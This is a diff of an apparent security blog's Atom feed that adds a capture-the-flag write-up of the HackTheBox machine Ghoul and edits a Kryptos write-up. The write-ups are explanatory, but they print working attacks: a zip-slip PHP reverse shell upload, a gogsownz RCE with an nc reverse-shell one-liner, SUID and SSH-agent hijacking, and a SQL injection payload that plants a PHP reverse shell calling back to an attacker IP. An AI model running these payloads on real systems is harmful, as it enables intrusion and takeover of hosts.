@@ -4,7 +4,7 @@
  <title>Highway to Root</title>
  <link href="http://localhost:4000/atom.xml" rel="self"/>
  <link href="http://localhost:4000/"/>
- <updated>2019-10-03T03:14:41+02:00</updated>
+ <updated>2019-10-10T00:20:52+01:00</updated>
  <id>http://localhost:4000</id>
  <author>
    <name>Michele Campobasso, Jacopo Cortellazzi, Andrea Melis</name>
@@ -13,9 +13,384 @@
 
  
  <entry>
+   <title>Ghoul - 10.10.10.101</title>
+   <link href="http://localhost:4000/2019/10/04/ghoul/"/>
+   <updated>2019-10-04T00:00:00+01:00</updated>
+   <id>http://localhost:4000/2019/10/04/ghoul</id>
+   <content type="html">&lt;h1 id=&quot;user&quot;&gt;USER&lt;/h1&gt;
+
+&lt;p&gt;As usual we always start with &lt;strong&gt;Nmap&lt;/strong&gt; scanning:&lt;/p&gt;
+
+&lt;pre&gt;root@pentestbox:~# nmap -sC -sV -oA ghoul 10.10.10.101
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c1:1c:4b:0c:c6:de:ae:99:49:15:9e:f9:bc:80:d2:3f (RSA)
+|_  256 a8:21:59:7d:4c:e7:97:ad:78:51:da:e5:f0:f9:ab:7d (ECDSA)
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-favicon: Unknown favicon MD5: A64A06AAE4304C2B3921E4FA5C9FF39C
+| http-methods: 
+|_  Supported Methods: POST OPTIONS HEAD GET
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Aogiri Tree
+2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 63:59:8b:4f:8d:0a:e1:15:44:14:57:27:e7:af:fb:3b (RSA)
+|   256 8c:8b:a0:a8:85:10:3d:27:07:51:29:ad:9b:ec:57:e3 (ECDSA)
+|_  256 9a:f5:31:4b:80:11:89:26:59:61:95:ff:5c:68:bc:a7 (ED25519)
+8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=Aogiri
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Apache Tomcat/7.0.88 - Error report
+
+&lt;/pre&gt;
+
+&lt;p&gt;Due to the fact that there doesn’t seems to be nothing really interesting on the website on port 80 and that the one on port 8080 is protected from a basic authentication, I run gobuster on port 80.&lt;/p&gt;
+
+&lt;pre&gt; /root/go/bin/gobuster dir -u http://10.10.10.101/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -o gobuster --timeout 30s
+
+/index.html (Status: 200)
+/images (Status: 301)
+/blog.html (Status: 200)
+/contact.html (Status: 200)
+/archives (Status: 301)
+/uploads (Status: 301)
+/users (Status: 301)
+/css (Status: 301)
+/js (Status: 301)
+/secret.php (Status: 200)
+/less (Status: 301)
+/server-status (Status: 403)
+&lt;/pre&gt;
+
+&lt;p&gt;This reveals an interesting page, secret.php.
+It shows a chat between system admins  talking about an RCE on the current infrastructure.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Ghoul/secret_1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Due to the fact that the enumeration didn’t show anything else interesting here I swapped port and went to port 8080. I then tried &lt;strong&gt;admin:admin&lt;/strong&gt; and it worked, revealing a website for uploading images or zip files on the server.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Ghoul/zip_2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After a few tests in which I verified that it is not possible to easily evade the file-type filters of the upload form I searched a bit on google and I found the Ziplib vulnerability (https://github.com/snyk/zip-slip-vulnerability). This vulnerability allows to write arbitrary files because the zip archives contains directory traversal filenames.&lt;/p&gt;
+
+&lt;p&gt;The main Idea is then to being able to upload a php reverse shell on the webserver using this vulnerability. I took then the reverse.php from kali and created a set of folders with depth 5 - just to being sure to reach the / folder of the target system- in order to run the following command:&lt;/p&gt;
+
+&lt;pre&gt;
+zip ziplib_www.zip ../../../../../var/www/html/rev.php
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Ghoul/zip_slip_3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Once uploaded the ziplib_www.zip file using the upload form, connecting to http://10.10.10.101:80/rev.php returns a reverse shell on our netcat listener.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Ghoul/rev_4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Enumerating the box, I noticed that there are three users with a login: eto,kaneki and noro.
+LinEnum.sh shows up interesting backup files under the folder /var/backups . After having downloaded the whole directory using a meterpreter session and figured out that most of the files are rabbit holes I focused only on the directory /var/backups/backups/keys, which contains three old ssh private keys of the three users.
+Unfortunately all these keys are encrypted so I had to find a way to decrypt those. I tried then to use JTR , converting the ssh keys using ssh2john script:&lt;/p&gt;
+
+&lt;pre&gt; python /root/Documents/cryptography/JohnTheRipper/run/ssh2john.py kaneki.backup &lt;/pre&gt;
+
+&lt;p&gt;After multiple failures using rockyou for cracking the three of them, I decided to use cewl on the secret.php page in order to create an alternative wordlist.&lt;/p&gt;
+
+&lt;pre&gt;cewl http://10.10.10.101/secret.php &amp;gt; cewl.txt&lt;/pre&gt;
+
+&lt;p&gt;And finally I got it cracked!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Ghoul/ssh_pswd_5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The ssh decryption password for kaneki ssh is &lt;strong&gt;ILoveTouka&lt;/strong&gt; and I am finally able to login as kaneki. 
+Got user !&lt;/p&gt;
+
+&lt;p&gt;user.txt
+7c0f11041f210f4f7d1711d40a1c35c2&lt;/p&gt;
+
+&lt;h1 id=&quot;root&quot;&gt;ROOT&lt;/h1&gt;
+
+&lt;p&gt;The first thing to notice are two notes present into the home folder of kaneki:&lt;/p&gt;
+
+&lt;pre&gt;note.txt :Vulnerability in Gogs was detected. I shutdown the registration function on our server, please ensure that no one gets access to the test accounts
+
+notes : I've set up file server into the server's network ,Eto if you need to transfer files to the server can use my pc. DM me for the access.&lt;/pre&gt;
+
+&lt;p&gt;These are interesting because they make me understand two things:  first , there is another vulnerability to exploit around, probably usefull for privesc, and second, that we are into a virtualized network, specifically a Docker container - we can notice the file .dockerenv in the / folder.&lt;/p&gt;
+
+&lt;p&gt;Indeed, looking at ifconfig:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Ghoul/ifconfig_6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So apparently there is an internal network 172.20.0.0/24 and we need to explore it.
+Indeed, after uploading nmap and having run:&lt;/p&gt;
+
+&lt;pre&gt;nmap -p-  172.20.0.0-255
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-05-05 14:40 UTC
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for Aogiri (172.20.0.1)
+Host is up (0.00026s latency).
+Not shown: 1204 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-alt
+
+Nmap scan report for Aogiri (172.20.0.10)
+Host is up (0.00028s latency).
+Not shown: 1204 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-alt
+
+Nmap scan report for 64978af526b2.Aogiri (172.20.0.150)
+Host is up (0.00030s latency).
+Not shown: 1206 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh&lt;/pre&gt;
+
+&lt;p&gt;Enumerating more the whole FileSystem and searching for tomcat configuration files, which could contain interesting credentials, I found the following file:
+/usr/share/tomcat7/conf/tomcat-users.xml which contains a commented line :&lt;/p&gt;
+
+&lt;pre&gt; user username=&quot;admin&quot; password=&quot;test@aogiri123&quot; roles=&quot;admin&quot; &lt;/pre&gt;
+
+&lt;p&gt;Maybe it would be usefull later on.
+So it is clear that we have a new host in the network. Reading inside the .ssh folder of kaneki user I noticed a new ID of the current user:&lt;/p&gt;
+
+&lt;pre&gt;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhK6T0d7TXpXNf2anZ/02E0NRVKuSWVslhHaJjUYtdtBVxCJg+wv1oFGPij9hgefdmFIKbvjElSr+rMrQpfCn6v7GmaP2QOjaoGPPX0EUPn9swnReRgi7xSKvHzru/ESc9AVIQIaeTypLNT/FmNuyr8P+gFLIq6tpS5eUjMHFyd68SW2shb7GWDM73tOAbTUZnBv+z1fAXv7yg2BVl6rkknHSmyV0kQJw5nQUTm4eKq2AIYTMB76EcHc01FZo9vsebBnD0EW4lejtSI/SRC+YCqqY+L9TZ4cunyYKNOuAJnDXncvQI8zpE+c50k3UGIatnS5f2MyNVn1l1bYDFQgYl &lt;b&gt;kaneki_pub@kaneki-pc&lt;/b&gt;
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsiPbWC8feNW7o6emQUk12tFOcucqoS/nnKN/LM3hCtPN8r4by8Ml1IR5DctjeurAmlJtXcn8MqlHCRbR6hZKydDwDzH3mb6M/gCYm4fD9FppbOdG4xMVGODbTTPV/h2Lh3ITRm+xNHYDmWG84rQe++gJImKoREkzsUNqSvQv4rO1RlO6W3rnz1ySPAjZF5sloJ8Rmnk+MK4skfj00Gb2mM0/RNmLC/rhwoUC+Wh0KPkuErg4YlqD8IB7L3N/UaaPjSPrs2EDeTGTTFI9GdcT6LIaS65CkcexWlboQu3DDOM5lfHghHHbGOWX+bh8VHU9JjvfC8hDN74IvBsy120N5 kaneki@Aogiri&lt;/pre&gt;
+
+&lt;p&gt;Acknoweldging that we are currently into the Aogiri host, guess drives me to say that probably 172.20.0.150 is kaneki-pc. 
+I tried then to use the current private ssh key present into the ssh folder of kaneki to connect to the remote host:&lt;/p&gt;
+
+&lt;pre&gt;kaneki@Aogiri:~/.ssh$ ssh -i id_rsa kaneki_pub@172.20.0.150&lt;/pre&gt;
+
+&lt;p&gt;Using the same password as before .. and it worked, I am in!
+I noticed then another text file:&lt;/p&gt;
+
+&lt;pre&gt;to-do.txt : Give AogiriTest user access to Eto for git.&lt;/pre&gt;
+
+&lt;p&gt;This means that there is a git repo somewhere on one of these hosts, which could contain interesting info. Moreover, looking at ifconfig, I noticed that this box is connected to a new subnet,172.18.0.0/24:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Ghoul/ifconfig_7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In order to upload nmap also on this box, I used an ssh tunneling:&lt;/p&gt;
+
+&lt;pre&gt;ssh -L 9000:172.20.0.150:22 -i ./Backups/kaneki.backup  kaneki@10.10.10.101
+scp -P9000 -i id_rsa ./nmap kaneki_pub@127.0.0.1:/tmp&lt;/pre&gt;
+
+&lt;p&gt;And in this way I have been able to successfully upload nmap to kaneki-pc ( 172.20.0.150 ).&lt;/p&gt;
+
+&lt;pre&gt;kaneki_pub@kaneki-pc:/tmp$ ./nmap -p- 172.18.0.0-255
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-05-06 13:14 GMT
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for Aogiri (172.18.0.1)
+Host is up (0.00023s latency).
+Not shown: 65530 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+2222/tcp  open  unknown
+8080/tcp  open  http-alt
+10007/tcp open  unknown
+
+Nmap scan report for cuff_web_1.cuff_default (172.18.0.2)
+Host is up (0.00028s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+3000/tcp open  unknown - HTTP
+
+Nmap scan report for kaneki-pc (172.18.0.200)
+Host is up (0.00030s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+&lt;/pre&gt;
+
+&lt;p&gt;As it is possible to observer, there is a new host ,172.18.0.2, with ssh and http open on port 3000. In order to check what  is present on that server, I had to tunnel again over ssh, using this time the existing tunnel already present.&lt;/p&gt;
+
+&lt;pre&gt;ssh -L 9100:172.18.0.2:3000 -i id_rsa  kaneki_pub@localhost -p 9000 &lt;/pre&gt;
+
+&lt;p&gt;And we can see a login screen of Gogs.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Ghoul/web_8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After enormous time spent bruteforcing the credentials I just tried to use all users and passwords already found on the box and I finally found the right combination.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;AogiriTest:test@aogiri123&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Ghoul/gogs_9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;From a previous note we know there is a vulnerability on gogs so google is our best friend here..
+And I found this coll github repo with Poc : https://github.com/TheZ3ro/gogsownz.
+So mainly we are able to obtain a RCE on gogs. Let’s try to obtain a reverse shell!&lt;/p&gt;
+
+&lt;p&gt;After having uploaded netcat through scp :&lt;/p&gt;
+
+&lt;pre&gt; scp -P9000 -i id_rsa ./ncat kaneki_pub@127.0.0.1:/tmp&lt;/pre&gt;
+
+&lt;p&gt;and having started a local listener we run the following command:&lt;/p&gt;
+
+&lt;pre&gt;python3 gogsownz.py http://127.0.0.1:9100/ -C 'AogiriTest:test@aogiri123' --rce 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 172.18.0.200 8000 &amp;gt;/tmp/f'  --cleanup&lt;/pre&gt;
+
+&lt;p&gt;And I am git on 172.18.0.2!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Ghoul/root_9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Enumerating the system I noticed that there is only one user except root, which git, which seems mandatory for Gogs. This seems pointless so go on with enumeration!
+Let’s try with classical Linux enumeration files using  https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+Running enumeration for SUID binaries we see something interesting:&lt;/p&gt;
+
+&lt;pre&gt;/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chage
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/expiry
+&lt;b&gt;/usr/sbin/gosu&lt;/b&gt;
+/bin/su&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Ghoul/gosu_10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So just running:&lt;/p&gt;
+
+&lt;pre&gt;gosu root bash&lt;/pre&gt;
+
+&lt;p&gt;allows to become root.&lt;/p&gt;
+
+&lt;p&gt;Going into the /root folder I can see interesting information:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Ghoul/root_12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So we have new credentials :&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;kaneki:12345ILoveTouka!!!&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;I tried to log in into Gogs with those but there is only a gogstest report, totally empty and useless. Lets focus on the other file: &lt;strong&gt;aogiri-app.7z&lt;/strong&gt;
+After having downloaded it locally:&lt;/p&gt;
+
+&lt;pre&gt;chmod 777 aogiri-app.7z
+cp aogiri-app.7z /tmp
+ncat -l -p 1234 -q 1 &amp;gt; aogiri-app.7z&amp;lt; /dev/null → on 172.18.0.200
+cat aogiri-app.7z | nc 172.18.0.200 1234 → on 172.18.0.2
+scp -P9000 -i id_rsa kaneki_pub@127.0.0.1:/tmp/aogiri-app.7z  ./aogiri-app.7z &lt;/pre&gt;
+
+&lt;p&gt;I started looking at it closely. It is a git repository. Really interesting.
+It seems that initially I found some creds but unfortunately useless :(&lt;/p&gt;
+
+&lt;pre&gt;/src/main/resources# cat application.properties 
+server.port=8080
+spring.datasource.url=jdbc:mysql://172.18.0.1:3306/db
+spring.datasource.username=kaneki
+spring.datasource.password=jT7Hr$.[nF.)c)4C
+server.address=0.0.0.0
+
+spring.jpa.properties.hibernate.dialect = org.hibernate.dialect.MySQL5InnoDBDialect
+spring.jpa.hibernate.ddl-auto = validate
+
+spring.servlet.multipart.enabled=true
+spring.servlet.multipart.file-size-threshold=2KB
+spring.servlet.multipart.max-file-size=200MB
+spring.servlet.multipart.max-request-size=215MB&lt;/pre&gt;
+
+&lt;p&gt;As first we can look at it using common git commands, as log, show,branch etc.. but those are rabbit holes. Indeed, looking at the git logs we can see that there  is a remote git repository !&lt;/p&gt;
+
+&lt;pre&gt;logs/refs/heads/master:0000000000000000000000000000000000000000 8b7452057fc35b5bd81a0b26a4bd2fe1220ab667 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062314 +0530    commit (initial): update readme
+logs/refs/heads/master:8b7452057fc35b5bd81a0b26a4bd2fe1220ab667 bec96aaf334dc0110caa163e308d4e2fc2b8f133 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062622 +0530    commit: updated dependencies
+logs/refs/heads/master:bec96aaf334dc0110caa163e308d4e2fc2b8f133 51d2c360b13b37ad608361642bd86be2a4983789 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062722 +0530    commit: added readme
+logs/refs/heads/master:51d2c360b13b37ad608361642bd86be2a4983789 ed5a88cbbc084cba1c0954076a8d7f6f5ce0d64b kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062881 +0530    commit: mysql support
+logs/refs/heads/master:813e0a518064778343ba54b64e16ad44c19900fb b3752e00721b4b87c99ef58e3a54143061b20b99 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546063447 +0530    commit: noro stop doing stupid shit
+logs/refs/heads/master:b3752e00721b4b87c99ef58e3a54143061b20b99 e29ad435b1cf4d9e777223a133a5b0a9aaa20625 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546063698 +0530    commit: added service
+logs/refs/heads/master:e29ad435b1cf4d9e777223a133a5b0a9aaa20625 0d426b533d4f1877f8a114620be8a1294f34ab71 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064090 +0530    commit: update dependencies
+logs/refs/heads/master:0d426b533d4f1877f8a114620be8a1294f34ab71 e29ad435b1cf4d9e777223a133a5b0a9aaa20625 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064281 +0530    reset: moving to HEAD^
+logs/refs/heads/master:e29ad435b1cf4d9e777223a133a5b0a9aaa20625 0d426b533d4f1877f8a114620be8a1294f34ab71 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064622 +0530    reset: moving to 0d426b5
+logs/refs/heads/master:0d426b533d4f1877f8a114620be8a1294f34ab71 b3752e00721b4b87c99ef58e3a54143061b20b99 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064718 +0530    reset: moving to b3752e0
+logs/refs/heads/master:b3752e00721b4b87c99ef58e3a54143061b20b99 b43757dbbefdb3af3966fbd5ca273496180dc913 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064792 +0530    commit: added mysql deps
+logs/refs/heads/master:b43757dbbefdb3af3966fbd5ca273496180dc913 647c5f1a2f95e117244d9128bff7a579ca1d4968 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546065100 +0530    commit: changed service
+&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:0000000000000000000000000000000000000000 98ecb8ad40e3d47029bfecd3e356d4b880d835e3 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062361 +0530   pull: storing head
+&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:98ecb8ad40e3d47029bfecd3e356d4b880d835e3 8b7452057fc35b5bd81a0b26a4bd2fe1220ab667 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062429 +0530   update by push
+&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:8b7452057fc35b5bd81a0b26a4bd2fe1220ab667 bec96aaf334dc0110caa163e308d4e2fc2b8f133 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062643 +0530   update by push
+&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:bec96aaf334dc0110caa163e308d4e2fc2b8f133 51d2c360b13b37ad608361642bd86be2a4983789 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062735 +0530   update by push
+&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:51d2c360b13b37ad608361642bd86be2a4983789 ed5a88cbbc084cba1c0954076a8d7f6f5ce0d64b kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062891 +0530   update by push
+&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:813e0a518064778343ba54b64e16ad44c19900fb b3752e00721b4b87c99ef58e3a54143061b20b99 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546063465 +0530   update by push
+&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:b3752e00721b4b87c99ef58e3a54143061b20b99 e29ad435b1cf4d9e777223a133a5b0a9aaa20625 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546063708 +0530   update by push
+&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:e29ad435b1cf4d9e777223a133a5b0a9aaa20625 0d426b533d4f1877f8a114620be8a1294f34ab71 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064105 +0530   update by push
+&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:0d426b533d4f1877f8a114620be8a1294f34ab71 e29ad435b1cf4d9e777223a133a5b0a9aaa20625 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064304 +0530   update by push
+&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:e29ad435b1cf4d9e777223a133a5b0a9aaa20625 0d426b533d4f1877f8a114620be8a1294f34ab71 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064632 +0530   update by push
+&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:0d426b533d4f1877f8a114620be8a1294f34ab71 b43757dbbefdb3af3966fbd5ca273496180dc913 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064802 +0530   update by push
+&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:b43757dbbefdb3af3966fbd5ca273496180dc913 647c5f1a2f95e117244d9128bff7a579ca1d4968 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546065107 +0530   update by push&lt;/pre&gt;
+
+&lt;p&gt;Looking at the configurations, this remote has been hosted by gogs , probably a while ago and we cannot access it anymore. The only hope is that some crucial information has been stored into git objects.
+Git objects can be found under .git/objects folder and they are zlib files. Luckily for us, stackoverflow will help ! https://stackoverflow.com/questions/3178566/how-to-deflate-with-a-command-line-tool-to-extract-a-git-object&lt;/p&gt;
+
+&lt;pre&gt;printf &quot;\x1f\x8b\x08\x00\x00\x00\x00\x00&quot; | cat - .git/objects/c0/fb67ab3fda7909000da003f4b2ce50a53f43e7 | gunzip → this works!&lt;/pre&gt;
+
+&lt;p&gt;So start trying all the the git objects one by one, taking note for eventual new password appearing, suddenly I got something…&lt;/p&gt;
+
+&lt;pre&gt;
+    /.git/objects/41# printf &quot;\x1f\x8b\x08\x00\x00\x00\x00\x00&quot; | cat - * | gunzip | strings
+
+gzip: stdin: unexpected end of file
+blob 476
+server.port=8080
+spring.datasource.url=jdbc:mysql://localhost:3306/db
+spring.datasource.username=root
+spring.datasource.password=g_xEN$ZuWD7hJf2G
+&lt;/pre&gt;
+
+&lt;p&gt;Tried the new password everywhere… Nein!&lt;/p&gt;
+
+&lt;pre&gt;gzip: stdin: unexpected end of file
+blob 478
+server.port=8080
+spring.datasource.url=jdbc:mysql://localhost:3306/db
+spring.datasource.username=kaneki
+spring.datasource.password=7^Grc%C\7xEQ?tb4
+server.address=0.0.0.0&lt;/pre&gt;
+
+&lt;p&gt;And the new password… works! We are able to become root on 172.20.0.150&lt;/p&gt;
+
+&lt;pre&gt;su : pasword 7^Grc%C\7xEQ?tb4&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Ghoul/kaneki_13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;…
+Ok so we are root on the 172.18.0.200, the only host that is still untouched is the docker server on 172.20.0.1. Maybe on the filesystem there are some info for connect to it.
+Run enumeration, nothing.
+Lets try conjobs, just run pspy64 and wait a while.
+And finally something weird happened:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Ghoul/pspy_14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It seems that some other host is passing through this host to reach 172.18.0.1 for a root session on it…interesting
+After a bit of googling I got my answer:&lt;/p&gt;
+
+&lt;p&gt;https://www.clockwork.com/news/2012/09/28/602/ssh_agent_hijacking/&lt;/p&gt;
+
+&lt;p&gt;So I can Hijack the SSH session. I just need to be fast.&lt;/p&gt;
+
+&lt;pre&gt;SSH_AUTH_SOCK=/tmp/ssh-e6wtZlMHTY/agent.1061 ssh root@172.18.0.1 -p 2222&lt;/pre&gt;
+
+&lt;p&gt;finally root…
+&lt;img src=&quot;/images/Ghoul/root_15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;who-ate-the-ghoul--thank-you-for-reading-this-write-up-feedback-is-appreciated-happy-hacking-&quot;&gt;Who ate the Ghoul ? Thank you for reading this write-up. Feedback is appreciated! Happy hacking :)&lt;/h4&gt;
+
+</content>
+ </entry>
+ 
+ <entry>
    <title>Kryptos - 10.10.10.129</title>
    <link href="http://localhost:4000/2019/09/27/kryptos/"/>
-   <updated>2019-09-27T00:00:00+02:00</updated>
+   <updated>2019-09-27T00:00:00+01:00</updated>
    <id>http://localhost:4000/2019/09/27/kryptos</id>
    <content type="html">&lt;h1 id=&quot;user&quot;&gt;USER&lt;/h1&gt;
 
@@ -228,7 +603,7 @@ Query OK, 1 row affected (0.032 sec)
 
 &lt;h2 id=&quot;weak-encryption&quot;&gt;Weak encryption&lt;/h2&gt;
 
-&lt;p&gt;The webservice we find is a tool that allows us to encrypt files with two stream cyphers, AES-CBC and &lt;strong&gt;RC4&lt;/strong&gt;. The decryption part is still under construction. RC4 is vulnerable to &lt;a href=&quot;https://crypto.stackexchange.com/questions/45021/rc4-finding-key-if-we-know-plain-text-and-ciphertext&quot;&gt;known-cleartext attacks&lt;/a&gt; under the condition in which the keystream generated has always the same initialization vector.&lt;/p&gt;
+&lt;p&gt;We found a webservice exposing a tool that allows us to encrypt files with two stream cyphers, AES-CBC and &lt;strong&gt;RC4&lt;/strong&gt;. The decryption part is still under construction. RC4 is vulnerable to &lt;a href=&quot;https://crypto.stackexchange.com/questions/45021/rc4-finding-key-if-we-know-plain-text-and-ciphertext&quot;&gt;known-cleartext attacks&lt;/a&gt; under the condition in which the keystream generated has always the same initialization vector.&lt;/p&gt;
 
 &lt;p&gt;The logic behind the attack can be summed up in the following steps:&lt;/p&gt;
 
@@ -385,7 +760,7 @@ else
 &amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;
 &amp;lt;body&amp;gt;
 Opened database successfully
-Query : SELECT * FROM books WHERE id=1;ATTACH DATABASE './d9e28afcf0b274a5e0542abb67db0784/db.php' AS d; CREATE TABLE d.p (pp TEXT); INSERT INTO d.p (pp) VALUES ('&amp;lt;?php set_time_limit(0);$i=&quot;10.10.16.9&quot;;$p=91;$cs=1400;$sh=&quot;/bin/sh -i&quot;;$d=null;$e=null;$s=fsockopen($i,$p,$en,$es,30);$ds=array(0=&amp;gt;array(&quot;pipe&quot;,&quot;r&quot;),1=&amp;gt;array(&quot;pipe&quot;,&quot;w&quot;),2=&amp;gt;array(&quot;pipe&quot;,&quot;w&quot;));$pr=proc_open($sh,$ds,$pp);if(!is_resource($pr)){exit(1);}stream_set_blocking($pp[0],0);stream_set_blocking($pp[1],0);stream_set_blocking($pp[2],0);stream_set_blocking($s,0);while(1){if(feof($s)){break;}if(feof($pp[1])){break;}$r=array($s,$pp[1],$pp[2]);$n=stream_select($r,$d,$e,null);if(in_array($s,$r)){$in=fread($s,$cs);fwrite($pp[0],$in);}if(in_array($pp[1],$r)){$in=fread($pp[1],$cs);fwrite($s,$in);}if(in_array($pp[2],$r)){$in=fread($pp[2],$cs);fwrite($s,$in);}}fclose($s);fclose($pp[0]);fclose($pp[1]);fclose($pp[2]);proc_close($pr); ?&amp;gt;');-- 
+Query : SELECT * FROM books WHERE id=1;ATTACH DATABASE './d9e28afcf0b274a5e0542abb67db0784/db.php' AS d; CREATE TABLE d.p (pp TEXT); INSERT INTO d.p (pp) VALUES (&amp;lt;?php'$s=fsockopen(&quot;10.10.16.44&quot;,9119);`/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3`;?&amp;gt;');-- 
 &amp;lt;/body&amp;gt;
 &amp;lt;/html&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
@@ -409,6 +784,13 @@ root@pentestbox:~# python break_rc4.py 32mbgmnqsu2rs11jcnbepejcis /dev/d9e28afcf
 listening on [any] 9119 ...
 
